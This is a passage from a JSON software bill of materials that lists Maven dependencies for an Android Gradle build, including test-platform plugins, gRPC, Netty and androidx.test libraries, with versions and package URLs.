\"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-device-info\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-device-info-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-device-info\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-emulator-control\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"commons-io\",\n            \"name\": \"commons-io\",\n            \"version\": \"2.13.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/commons-io/commons-io@2.13.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/commons-io/commons-io@2.13.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.code.gson\",\n            \"name\": \"gson\",\n            \"version\": \"2.10.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-emulator-control-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.emulator\",\n            \"name\": \"proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.emulator/proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.emulator/proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.grpc\",\n            \"name\": \"grpc-core\",\n            \"version\": \"1.57.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.grpc\",\n            \"name\": \"grpc-api\",\n            \"version\": \"1.57.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.android\",\n            \"name\": \"annotations\",\n            \"version\": \"4.1.1.4\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.android/annotations@4.1.1.4?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.android/annotations@4.1.1.4?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.codehaus.mojo\",\n            \"name\": \"animal-sniffer-annotations\",\n            \"version\": \"1.23\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.codehaus.mojo/animal-sniffer-annotations@1.23?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.codehaus.mojo/animal-sniffer-annotations@1.23?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.perfmark\",\n            \"name\": \"perfmark-api\",\n            \"version\": \"0.26.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.perfmark/perfmark-api@0.26.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/io.perfmark/perfmark-api@0.26.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.grpc\",\n            \"name\": \"grpc-context\",\n            \"version\": \"1.57.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.grpc/grpc-context@1.57.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/io.grpc/grpc-context@1.57.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.grpc\",\n            \"name\": \"grpc-netty\",\n            \"version\": \"1.57.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.grpc/grpc-netty@1.57.0?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.grpc/grpc-netty@1.57.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-codec-http2\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-codec-http2@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-codec-http2@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-common\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-buffer\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-transport\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-resolver\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-resolver@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-resolver@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-codec\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-handler\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-handler@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-handler@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-transport-native-unix-common\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-transport-native-unix-common@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-transport-native-unix-common@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-codec-http\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-codec-http@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-codec-http@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-handler-proxy\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-handler-proxy@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-handler-proxy@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.netty\",\n            \"name\": \"netty-codec-socks\",\n            \"version\": \"4.1.93.Final\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.netty/netty-codec-socks@4.1.93.Final?type=jar\",\n            \"type\": \"framework\",\n            \"bom-ref\": \"pkg:maven/io.netty/netty-codec-socks@4.1.93.Final?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.grpc\",\n            \"name\": \"grpc-protobuf\",\n            \"version\": \"1.57.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.grpc/grpc-protobuf@1.57.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/io.grpc/grpc-protobuf@1.57.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.api.grpc\",\n            \"name\": \"proto-google-common-protos\",\n            \"version\": \"2.17.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.api.grpc/proto-google-common-protos@2.17.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.api.grpc/proto-google-common-protos@2.17.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.grpc\",\n            \"name\": \"grpc-protobuf-lite\",\n            \"version\": \"1.57.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.grpc/grpc-protobuf-lite@1.57.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/io.grpc/grpc-protobuf-lite@1.57.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"io.grpc\",\n            \"name\": \"grpc-stub\",\n            \"version\": \"1.57.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/io.grpc/grpc-stub@1.57.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/io.grpc/grpc-stub@1.57.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"javax.annotation\",\n            \"name\": \"javax.annotation-api\",\n            \"version\": \"1.3.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/javax.annotation/javax.annotation-api@1.3.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/javax.annotation/javax.annotation-api@1.3.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.crypto.tink\",\n            \"name\": \"tink\",\n            \"version\": \"1.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.crypto.tink/tink@1.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.crypto.tink/tink@1.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-emulator-control\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-logcat\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-logcat\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-logcat-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-logcat\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-retention\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-retention\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-host-retention-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-host-retention\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-result-listener-gradle\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-result-listener-gradle\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.android.tools.utp\",\n            \"name\": \"android-test-plugin-result-listener-gradle-proto\",\n            \"version\": \"31.4.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle-proto@31.4.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle-proto@31.4.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-android-test-plugin-result-listener-gradle\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.testing.platform\",\n            \"name\": \"core\",\n            \"version\": \"0.0.9-alpha02\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.testing.platform/core@0.0.9-alpha02?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.testing.platform/core@0.0.9-alpha02?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"_internal-unified-test-platform-core\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test.ext\",\n            \"name\": \"junit\",\n            \"version\": \"1.1.5\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.test.ext/junit@1.1.5?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test.ext/junit@1.1.5?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test.espresso\",\n            \"name\": \"espresso-core\",\n            \"version\": \"3.5.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.test.espresso/espresso-core@3.5.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test.espresso/espresso-core@3.5.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.compose\",\n            \"name\": \"compose-bom\",\n            \"version\": \"2024.04.00\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.compose/compose-bom@2024.04.00?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.compose/compose-bom@2024.04.00?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"junit\",\n            \"name\": \"junit\",\n            \"version\": \"4.13.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/junit/junit@4.13.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/junit/junit@4.13.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.hamcrest\",\n            \"name\": \"hamcrest-core\",\n            \"version\": \"1.3\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.hamcrest/hamcrest-core@1.3?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.hamcrest/hamcrest-core@1.3?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test\",\n            \"name\": \"core\",\n            \"version\": \"1.5.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.test/core@1.5.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test/core@1.5.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.annotation\",\n            \"name\": \"annotation\",\n            \"version\": \"1.7.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib\",\n            \"version\": \"1.8.22\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"org.jetbrains.kotlin\",\n            \"name\": \"kotlin-stdlib-common\",\n            \"version\": \"1.8.22\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.8.22?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test\",\n            \"name\": \"monitor\",\n            \"version\": \"1.6.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test\",\n            \"name\": \"annotation\",\n            \"version\": \"1.0.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.test/annotation@1.0.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test/annotation@1.0.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.annotation\",\n            \"name\": \"annotation-experimental\",\n            \"version\": \"1.1.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.annotation/annotation-experimental@1.1.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.annotation/annotation-experimental@1.1.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.tracing\",\n            \"name\": \"tracing\",\n            \"version\": \"1.0.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test.services\",\n            \"name\": \"storage\",\n            \"version\": \"1.4.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.test.services/storage@1.4.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test.services/storage@1.4.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.code.findbugs\",\n            \"name\": \"jsr305\",\n            \"version\": \"2.0.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.code.findbugs/jsr305@2.0.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.code.findbugs/jsr305@2.0.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.lifecycle\",\n            \"name\": \"lifecycle-common\",\n            \"version\": \"2.3.1\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.lifecycle/lifecycle-common@2.3.1?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.lifecycle/lifecycle-common@2.3.1?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"com.google.guava\",\n            \"name\": \"listenablefuture\",\n            \"version\": \"1.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/com.google.guava/listenablefuture@1.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/com.google.guava/listenablefuture@1.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.concurrent\",\n            \"name\": \"concurrent-futures\",\n            \"version\": \"1.1.0\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.concurrent/concurrent-futures@1.1.0?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.concurrent/concurrent-futures@1.1.0?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test\",\n            \"name\": \"runner\",\n            \"version\": \"1.5.2\",\n            \"scope\": \"optional\",\n            \"purl\": \"pkg:maven/androidx.test/runner@1.5.2?type=jar\",\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:maven/androidx.test/runner@1.5.2?type=jar\",\n            \"properties\": [\n                {\n                    \"name\": \"GradleProfileName\",\n                    \"value\": \"androidTestImplementation\"\n                }\n            ]\n        },\n        {\n            \"group\": \"androidx.test.espresso\",\n            \"name\": \"espresso-idling-resource\",\n            \"version\": \"3.5.1\",\n            \"scope\": \"optional\",\n            \"purl\": 